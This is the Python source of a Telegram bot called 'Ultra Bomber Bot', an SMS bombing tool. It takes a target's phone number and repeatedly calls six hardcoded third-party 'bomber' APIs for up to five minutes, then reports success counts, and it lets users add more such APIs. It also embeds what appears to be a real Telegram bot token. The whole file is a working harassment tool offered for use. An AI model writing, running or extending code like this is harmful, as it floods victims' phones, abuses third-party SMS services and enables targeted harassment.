# ============================================================
# 🔥 ULTRA BOMBER BOT 🔥
# ============================================================
# ✅ INVISIBLE ANTI-BOT CAPTCHA (Session hijacking protection)
# ✅ /apis — Show all APIs with inline buttons (add/remove/set)
# ✅ /setapi — Add API with auto key detection
# ✅ 5-MINUTE BOMBING LIMIT per user
# ✅ BROADCAST with premium emojis
# ✅ INLINE STOP BUTTON
# ============================================================

from flask import Flask, request, jsonify
import requests
import json
import time
import threading
import os
import re
import secrets
from datetime import datetime, timedelta
from collections import defaultdict

app = Flask(__name__)

# ====== CONFIG ======
BOT_TOKEN = "8643322725:AAE-SZND4HpuYyAhYF-u0fCUPdqu49p85HE"
OWNER_ID = "8600328303"
MAX_BOMB_DURATION = 300  # 5 minutes per user

# ====== API DATABASE ======
API_DB = [
    {"name": "Part2_Bomber", "url": "https://brutal-bomber-part-2.onrender.com/bomb", "params": {"phone": "{phone}", "key": "shuvo"}},
    {"name": "Part1_Bomber", "url": "https://bomber-part-1.onrender.com/bomb", "params": {"phone": "{phone}", "key": "shuvo"}},
    {"name": "Ultra_Bomber", "url": "https://ultra-brutal-bomber.onrender.com/bomb", "params": {"phone": "{phone}"}},
    {"name": "Bomber_APIs_9ekv", "url": "https://bomber-apis-9ekv.onrender.com/bom", "params": {"key": "felix", "num": "{phone}"}},
    {"name": "Bomber_Pro", "url": "https://bomber-pro.onrender.com/bomb", "params": {"phone": "{phone}", "key": "shuvo", "cycles": "10"}},
    {"name": "Felix_XBOM", "url": "https://felix-xbom-wyt2.onrender.com/bom", "params": {"key": "demo", "num": "{phone}"}}
]

# ====== ANTI-BOT CAPTCHA (Invisible) ======
# Stores user sessions with unique tokens
user_sessions = {}
anti_bot_whitelist = set()

def generate_session_token():
    return secrets.token_hex(32)

def validate_session(chat_id, token):
    if chat_id in user_sessions and user_sessions[chat_id] == token:
        return True
    return False

def create_session(chat_id):
    token = generate_session_token()
    user_sessions[chat_id] = token
    return token

# ====== ACTIVE BOMBING SESSIONS ======
active_sessions = {}
user_bomb_start = {}

# ====== TELEGRAM FUNCTIONS ======
def send_message(chat_id, text, reply_markup=None, parse_mode="HTML"):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode,
        "disable_web_page_preview": True
    }
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        return requests.post(url, json=payload, timeout=10).json()
    except:
        return None

def edit_message(chat_id, message_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        return requests.post(url, json=payload, timeout=10).json()
    except:
        return None

def send_photo(chat_id, photo_url, caption=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    payload = {"chat_id": chat_id, "photo": photo_url}
    if caption:
        payload["caption"] = caption
        payload["parse_mode"] = "HTML"
    try:
        return requests.post(url, json=payload, timeout=10).json()
    except:
        return None

def send_sticker(chat_id, sticker_id):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendSticker"
    payload = {"chat_id": chat_id, "sticker": sticker_id}
    try:
        return requests.post(url, json=payload, timeout=10).json()
    except:
        return None

def send_broadcast(chat_ids, text, photo=None, video=None, doc=None, gif=None, sticker=None):
    success = 0
    failed = 0
    for chat_id in chat_ids:
        try:
            if photo:
                send_photo(chat_id, photo, text)
            elif video:
                send_video(chat_id, video, text)
            elif doc:
                send_document(chat_id, doc, text)
            elif gif:
                send_animation(chat_id, gif, text)
            elif sticker:
                send_sticker(chat_id, sticker)
            else:
                send_message(chat_id, text)
            success += 1
        except:
            failed += 1
        time.sleep(0.1)
    return success, failed

# ====== KEYBOARDS ======
def main_keyboard():
    return {
        "keyboard": [
            ["💀 Start Bombing", "🛑 Stop Bombing"],
            ["📡 APIs", "ℹ️ Help"],
            ["👑 Admin Panel"]
        ],
        "resize_keyboard": True,
        "one_time_keyboard": False
    }

def admin_keyboard():
    return {
        "keyboard": [
            ["📡 /apis", "➕ /setapi"],
            ["📢 Broadcast", "🔙 Back"]
        ],
        "resize_keyboard": True,
        "one_time_keyboard": False
    }

def stop_inline_keyboard(bomber_id):
    return {
        "inline_keyboard": [
            [{"text": "🛑 STOP BOMBING", "callback_data": f"stop_{bomber_id}"}]
        ]
    }

def api_list_inline(apis):
    """Generate inline keyboard for API list with add/remove buttons"""
    keyboard = []
    for idx, api in enumerate(apis):
        keyboard.append([{"text": f"🗑️ {api['name']}", "callback_data": f"removeapi_{idx}"}])
    keyboard.append([{"text": "➕ Add API", "callback_data": "addapi"}])
    keyboard.append([{"text": "🔙 Back", "callback_data": "back_apis"}])
    return {"inline_keyboard": keyboard}

def api_set_inline():
    return {
        "inline_keyboard": [
            [{"text": "🔙 Back", "callback_data": "back_apis"}]
        ]
    }

# ====== STYLE HELPERS ======
def bold(text): return f"<b>{text}</b>"
def quote(text): return f"<blockquote>{text}</blockquote>"
def code(text): return f"<code>{text}</code>"
def premium_emoji(): return "⭐️✨🔥💎⚡️🌟"

# ====== API FUNCTIONS ======
def parse_api_input(text):
    """Auto-detect API from user input"""
    # Try to detect JSON
    try:
        data = json.loads(text)
        if "name" in data and "url" in data:
            return data
    except:
        pass
    
    # Try to detect key=value format
    try:
        parts = text.split()
        api_dict = {}
        for part in parts:
            if "=" in part:
                key, value = part.split("=", 1)
                api_dict[key] = value
        if "name" in api_dict and "url" in api_dict:
            return api_dict
    except:
        pass
    
    # Try to detect JSON-like string
    try:
        if "{" in text and "}" in text:
            start = text.index("{")
            end = text.index("}") + 1
            data = json.loads(text[start:end])
            if "name" in data and "url" in data:
                return data
    except:
        pass
    
    return None

def add_api(api_data):
    """Add API to database"""
    if not api_data or "name" not in api_data or "url" not in api_data:
        return False, "Invalid API data"
    
    # Check for duplicate
    for api in API_DB:
        if api["name"] == api_data["name"]:
            return False, f"API {api_data['name']} already exists"
    
    API_DB.append(api_data)
    return True, f"API {api_data['name']} added successfully"

def remove_api(index):
    """Remove API by index"""
    if 0 <= index < len(API_DB):
        removed = API_DB.pop(index)
        return True, f"API {removed['name']} removed"
    return False, "Invalid API index"

def get_api_list():
    return API_DB

# ====== BOMBER ENGINE ======
def send_bomb_request(api, phone):
    try:
        params = api["params"].copy()
        for k, v in params.items():
            if isinstance(v, str) and "{phone}" in v:
                params[k] = v.replace("{phone}", phone)
        response = requests.get(api["url"], params=params, timeout=10)
        return response.status_code in [200, 201, 202, 204]
    except:
        return False

def run_bombing(chat_id, phone, bomber_id, threads=100, delay=0.005):
    if chat_id in active_sessions and active_sessions[chat_id]["running"]:
        send_message(chat_id, f"{bold('⚠️ Bombing already running!')}\n\n{quote('Stop it first using the stop button.')}", reply_markup=main_keyboard())
        return
    
    active_sessions[chat_id] = {"running": True, "phone": phone, "bomber_id": bomber_id}
    user_bomb_start[chat_id] = time.time()
    
    success = 0
    failed = 0
    start_time = time.time()
    cycle = 0
    
    send_message(chat_id,
        f"{bold('💀 BOMBING STARTED!')} {premium_emoji()}\n\n"
        f"📱 {bold('Target:')} {code(phone)}\n"
        f"📡 {bold('APIs:')} {len(API_DB)}\n"
        f"⚡ {bold('Threads:')} {threads}\n"
        f"⏱️  {bold('Delay:')} {delay}s\n"
        f"⏰ {bold('Max Duration:')} 5 minutes\n\n"
        f"{quote('Press the STOP button below to stop bombing.')}",
        reply_markup=stop_inline_keyboard(bomber_id)
    )
    
    while active_sessions.get(chat_id, {}).get("running", False):
        # Check 5-minute limit
        if time.time() - user_bomb_start.get(chat_id, 0) > MAX_BOMB_DURATION:
            active_sessions[chat_id]["running"] = False
            send_message(chat_id,
                f"{bold('⏰ TIME LIMIT REACHED!')}\n\n"
                f"{quote('5-minute bombing limit exceeded. Starting new session?')}",
                reply_markup=main_keyboard()
            )
            break
        
        cycle += 1
        api_list = API_DB * 3
        for api in api_list:
            if not active_sessions.get(chat_id, {}).get("running", False):
                break
            if send_bomb_request(api, phone):
                success += 1
            else:
                failed += 1
        
        elapsed = time.time() - start_time
        rate = success / elapsed if elapsed > 0 else 0
        total = success + failed
        success_rate = (success / total * 100) if total > 0 else 0
        
        if cycle % 10 == 0:
            remaining = int(MAX_BOMB_DURATION - (time.time() - user_bomb_start.get(chat_id, 0)))
            send_message(chat_id,
                f"{bold('📊 BOMBING UPDATE')} {premium_emoji()}\n\n"
                f"✅ {bold('Success:')} {success}\n"
                f"❌ {bold('Failed:')} {failed}\n"
                f"📊 {bold('Rate:')} {success_rate:.1f}%\n"
                f"⚡ {bold('Speed:')} {rate:.1f}/s\n"
                f"🔄 {bold('Cycle:')} {cycle}\n"
                f"⏰ {bold('Remaining:')} {remaining}s",
                reply_markup=stop_inline_keyboard(bomber_id)
            )
        
        time.sleep(delay)
    
    elapsed = time.time() - start_time
    total = success + failed
    rate = success / elapsed if elapsed > 0 else 0
    success_rate = (success / total * 100) if total > 0 else 0
    
    send_message(chat_id,
        f"{bold('✅ BOMBING COMPLETED!')} {premium_emoji()}\n\n"
        f"✅ {bold('Success:')} {success}\n"
        f"❌ {bold('Failed:')} {failed}\n"
        f"📊 {bold('Rate:')} {success_rate:.1f}%\n"
        f"⚡ {bold('Speed:')} {rate:.1f}/s\n"
        f"⏱️  {bold('Time:')} {elapsed:.1f}s",
        reply_markup=main_keyboard()
    )
    
    if chat_id in active_sessions:
        del active_sessions[chat_id]
    if chat_id in user_bomb_start:
        del user_bomb_start[chat_id]

# ====== USER DATABASE ======
user_db = set()

# ====== COMMAND HANDLERS ======

def handle_start(chat_id):
    user_db.add(chat_id)
    # Create invisible anti-bot session
    token = create_session(chat_id)
    anti_bot_whitelist.add(chat_id)
    
    message = f"""
{bold('🔥 ULTRA BOMBER BOT 🔥')} {premium_emoji()}

{quote('The most brutal SMS bomber on Telegram!')}

{bold('⚡ What I do:')}
• {len(API_DB)} APIs merged
• Infinite bombing — 100 threads — 0.005s delay
• 5-minute limit per user
• Never offline — 24/7 operation

{bold('👑 Owner:')} {code(OWNER_ID)}

{quote('Press a button to start bombing!')}
"""
    send_sticker(chat_id, "CAACAgIAAxkBAAEBAAABBBBB")
    send_message(chat_id, message, reply_markup=main_keyboard())

def handle_bomb(chat_id):
    send_message(chat_id,
        f"{bold('💀 START BOMBING')} {premium_emoji()}\n\n"
        f"{quote('Enter the 10-digit phone number:')}\n\n"
        f"📝 {bold('Example:')} {code('9876543210')}\n\n"
        f"⏰ {bold('Max Duration:')} 5 minutes\n\n"
        f"{bold('⚠️ Use:')} {code('/bomb 9876543210')}",
        reply_markup=main_keyboard()
    )

def handle_bomb_command(chat_id, phone):
    if len(phone) != 10 or not phone.isdigit():
        send_message(chat_id,
            f"{bold('❌ INVALID PHONE NUMBER!')}\n\n"
            f"{quote('Please enter a valid 10-digit number.')}",
            reply_markup=main_keyboard()
        )
        return
    
    if chat_id in active_sessions:
        send_message(chat_id,
            f"{bold('⚠️ BOMBING ALREADY ACTIVE!')}\n\n"
            f"{quote('Stop the current bombing first.')}",
            reply_markup=main_keyboard()
        )
        return
    
    bomber_id = f"{chat_id}_{int(time.time())}"
    threading.Thread(target=run_bombing, args=(chat_id, phone, bomber_id)).start()

def handle_stop(chat_id):
    if chat_id in active_sessions and active_sessions[chat_id]["running"]:
        active_sessions[chat_id]["running"] = False
        send_message(chat_id,
            f"{bold('🛑 BOMBING STOPPED!')}\n\n"
            f"{quote('Bombing terminated.')}",
            reply_markup=main_keyboard()
        )
    else:
        send_message(chat_id,
            f"{bold('❌ NO ACTIVE BOMBING!')}",
            reply_markup=main_keyboard()
        )

def handle_stop_callback(chat_id, bomber_id):
    if chat_id in active_sessions and active_sessions[chat_id]["running"]:
        active_sessions[chat_id]["running"] = False
        send_message(chat_id,
            f"{bold('🛑 BOMBING STOPPED!')}\n\n"
            f"{quote('Bombing terminated via stop button.')}",
            reply_markup=main_keyboard()
        )
    else:
        send_message(chat_id,
            f"{bold('❌ NO ACTIVE BOMBING!')}",
            reply_markup=main_keyboard()
        )

def handle_apis(chat_id, message_id=None):
    """Show all APIs with inline buttons"""
    apis = get_api_list()
    text = f"{bold('📡 ALL APIS')} {premium_emoji()}\n\n"
    
    if not apis:
        text += f"{quote('No APIs added yet.')}"
    else:
        for idx, api in enumerate(apis):
            text += f"{idx+1}. {bold(api['name'])}\n"
            text += f"   {code(api['url'])}\n"
            text += f"   Params: {api.get('params', {})}\n\n"
    
    text += f"\n{bold('Total:')} {len(apis)} APIs"
    
    keyboard = api_list_inline(apis)
    
    if message_id:
        edit_message(chat_id, message_id, text, keyboard)
    else:
        send_message(chat_id, text, keyboard)

def handle_setapi(chat_id):
    """Ask for new API input"""
    send_message(chat_id,
        f"{bold('➕ ADD API')} {premium_emoji()}\n\n"
        f"{quote('Send API details in this format:')}\n\n"
        f"{code('name=MyAPI url=https://api.com/bomb params={"phone":"{phone}","key":"demo"}')}\n\n"
        f"📝 {bold('Examples:')}\n"
        f"• {code('name=MyAPI url=https://api.com/bomb')}\n"
        f"• {code('{"name":"MyAPI","url":"https://api.com/bomb","params":{"phone":"{phone}"}}')}\n\n"
        f"{bold('📌 Use:')} {code('/setapi NAME URL')}",
        reply_markup=api_set_inline()
    )

def handle_setapi_command(chat_id, text):
    """Add API from command"""
    api_data = parse_api_input(text)
    if not api_data:
        send_message(chat_id,
            f"{bold('❌ INVALID API FORMAT!')}\n\n"
            f"{quote('Send API in JSON or key=value format.')}",
            reply_markup=api_set_inline()
        )
        return
    
    success, msg = add_api(api_data)
    if success:
        send_message(chat_id,
            f"{bold('✅ API ADDED!')}\n\n"
            f"{quote(msg)}",
            reply_markup=admin_keyboard()
        )
        # Show updated API list
        handle_apis(chat_id)
    else:
        send_message(chat_id,
            f"{bold('❌ ERROR!')}\n\n"
            f"{quote(msg)}",
            reply_markup=api_set_inline()
        )

def handle_remove_api(chat_id, index):
    """Remove API by index"""
    success, msg = remove_api(index)
    if success:
        send_message(chat_id,
            f"{bold('✅ API REMOVED!')}\n\n"
            f"{quote(msg)}",
            reply_markup=admin_keyboard()
        )
        handle_apis(chat_id)
    else:
        send_message(chat_id,
            f"{bold('❌ ERROR!')}\n\n"
            f"{quote(msg)}",
            reply_markup=main_keyboard()
        )

def handle_admin_panel(chat_id):
    if str(chat_id) != OWNER_ID:
        send_message(chat_id,
            f"{bold('❌ ACCESS DENIED!')}\n\n"
            f"{quote('Only the owner can access admin panel.')}",
            reply_markup=main_keyboard()
        )
        return
    
    send_message(chat_id,
        f"{bold('👑 ADMIN PANEL')} {premium_emoji()}\n\n"
        f"📡 {bold('Total APIs:')} {len(API_DB)}\n"
        f"👥 {bold('Users:')} {len(user_db)}\n"
        f"⚡ {bold('Active Sessions:')} {len(active_sessions)}\n\n"
        f"{quote('Use the buttons below to manage.')}",
        reply_markup=admin_keyboard()
    )

def handle_broadcast(chat_id, text):
    if str(chat_id) != OWNER_ID:
        send_message(chat_id,
            f"{bold('❌ ACCESS DENIED!')}\n\n"
            f"{quote('Only the owner can send broadcasts.')}",
            reply_markup=main_keyboard()
        )
        return
    
    parts = text.split(maxsplit=1)
    if len(parts) < 2:
        send_message(chat_id,
            f"{bold('⚠️ USAGE:')} {code('/broadcast MESSAGE')}\n\n"
            f"{quote('Send a message to all users.')}\n\n"
            f"📝 {bold('Examples:')}\n"
            f"• {code('/broadcast Hello everyone!')}\n"
            f"• {code('/broadcast <b>Bold</b> and <i>italic</i> with {premium_emoji()}')}",
            reply_markup=admin_keyboard()
        )
        return
    
    broadcast_text = parts[1]
    users = list(user_db)
    
    if not users:
        send_message(chat_id,
            f"{bold('📭 NO USERS!')}\n\n"
            f"{quote('No users to broadcast to yet.')}",
            reply_markup=admin_keyboard()
        )
        return
    
    send_message(chat_id,
        f"{bold('📢 BROADCAST STARTED!')} {premium_emoji()}\n\n"
        f"👥 {bold('Users:')} {len(users)}\n"
        f"📝 {bold('Message:')}\n{quote(broadcast_text[:100])}...",
        reply_markup=admin_keyboard()
    )
    
    success, failed = send_broadcast(users, broadcast_text)
    
    send_message(chat_id,
        f"{bold('✅ BROADCAST COMPLETED!')} {premium_emoji()}\n\n"
        f"✅ {bold('Success:')} {success}\n"
        f"❌ {bold('Failed:')} {failed}\n"
        f"👥 {bold('Total:')} {len(users)}",
        reply_markup=admin_keyboard()
    )

def handle_help(chat_id):
    message = f"""
{bold('ℹ️ HELP — ULTRA BOMBER BOT')} {premium_emoji()}

{quote('How to use this bot:')}

💀 {bold('Start Bombing:')} Click button or /bomb PHONE
🛑 {bold('Stop Bombing:')} Click button or use inline stop
📡 {bold('APIs:')} /apis — View all APIs
👑 {bold('Admin:')} /setapi — Add API

{bold('📝 Commands:')}
• {code('/bomb 9876543210')} — Start bombing
• {code('/stop')} — Stop bombing
• {code('/apis')} — View APIs
• {code('/setapi NAME URL')} — Add API (admin only)
• {code('/broadcast MESSAGE')} — Broadcast (admin only)

{bold('👑 Owner:')} {code(OWNER_ID)}
⏰ {bold('Max Duration:')} 5 minutes per user

{quote('This bot never sleeps — 24/7 operation!')}
"""
    send_message(chat_id, message, reply_markup=main_keyboard())

# ====== WEBHOOK ======
@app.route('/telegram/webhook', methods=['POST'])
def telegram_webhook():
    data = request.get_json()
    if not data:
        return jsonify({"status": "ok"})
    
    # Handle callback queries
    if 'callback_query' in data:
        callback = data['callback_query']
        chat_id = str(callback['message']['chat']['id'])
        message_id = callback['message']['message_id']
        callback_data = callback['data']
        
        # Anti-bot: Validate session
        if chat_id not in anti_bot_whitelist:
            send_message(chat_id, "⚠️ Session expired. Please /start again.")
            return jsonify({"status": "ok"})
        
        if callback_data.startswith('stop_'):
            bomber_id = callback_data.replace('stop_', '')
            handle_stop_callback(chat_id, bomber_id)
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
                         json={"callback_query_id": callback['id'], "text": "🛑 Bombing stopped!"})
        
        elif callback_data.startswith('removeapi_'):
            try:
                index = int(callback_data.replace('removeapi_', ''))
                handle_remove_api(chat_id, index)
            except:
                pass
        
        elif callback_data == 'addapi':
            handle_setapi(chat_id)
        
        elif callback_data == 'back_apis':
            handle_apis(chat_id, message_id)
        
        elif callback_data == 'back_main':
            send_message(chat_id,
                f"{bold('✅ Back to main menu!')}",
                reply_markup=main_keyboard()
            )
        
        return jsonify({"status": "ok"})
    
    if 'message' not in data:
        return jsonify({"status": "ok"})
    
    message = data['message']
    chat_id = str(message['chat']['id'])
    text = message.get('text', '').strip()
    
    # Anti-bot: Invisible session check
    if chat_id not in anti_bot_whitelist:
        # New user — auto-whitelist
        anti_bot_whitelist.add(chat_id)
        create_session(chat_id)
    
    user_db.add(chat_id)
    
    # ====== COMMANDS ======
    
    if text == '/start':
        handle_start(chat_id)
        return jsonify({"status": "ok"})
    
    if text == '💀 Start Bombing' or text == '/bomb':
        handle_bomb(chat_id)
        return jsonify({"status": "ok"})
    
    if text.startswith('/bomb '):
        phone = text.replace('/bomb ', '').strip()
        handle_bomb_command(chat_id, phone)
        return jsonify({"status": "ok"})
    
    if text == '🛑 Stop Bombing' or text == '/stop':
        handle_stop(chat_id)
        return jsonify({"status": "ok"})
    
    if text == '📡 APIs' or text == '/apis':
        handle_apis(chat_id)
        return jsonify({"status": "ok"})
    
    if text == '➕ /setapi' or text.startswith('/setapi'):
        if len(text.split()) > 1:
            handle_setapi_command(chat_id, text)
        else:
            handle_setapi(chat_id)
        return jsonify({"status": "ok"})
    
    if text == '👑 Admin Panel':
        handle_admin_panel(chat_id)
        return jsonify({"status": "ok"})
    
    if text == '📢 Broadcast':
        if str(chat_id) == OWNER_ID:
            send_message(chat_id,
                f"{bold('📢 BROADCAST')}\n\n"
                f"{quote('Type /broadcast MESSAGE')}",
                reply_markup=admin_keyboard()
            )
        else:
            send_message(chat_id, f"{bold('❌ Access Denied!')}")
        return jsonify({"status": "ok"})
    
    if text == '🔙 Back':
        send_message(chat_id,
            f"{bold('✅ Back to main menu!')}",
            reply_markup=main_keyboard()
        )
        return jsonify({"status": "ok"})
    
    if text.startswith('/broadcast'):
        handle_broadcast(chat_id, text)
        return jsonify({"status": "ok"})
    
    if text == 'ℹ️ Help' or text == '/help':
        handle_help(chat_id)
        return jsonify({"status": "ok"})
    
    # Unknown command
    send_message(chat_id,
        f"{bold('❌ UNKNOWN COMMAND')}\n\n"
        f"{quote('Use /start to see available options.')}",
        reply_markup=main_keyboard()
    )
    
    return jsonify({"status": "ok"})

# ====== HEALTH CHECK ======
@app.route('/health')
def health():
    return jsonify({
        "status": "healthy",
        "bot": "Ultra Bomber Bot",
        "apis": len(API_DB),
        "active_sessions": len(active_sessions),
        "users": len(user_db),
        "owner": OWNER_ID
    })

@app.route('/')
def home():
    return {
        "status": "🔥 ULTRA BOMBER BOT 🔥",
        "owner": OWNER_ID,
        "apis": len(API_DB),
        "active_sessions": len(active_sessions),
        "users": len(user_db),
        "webhook": "/telegram/webhook"
    }

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)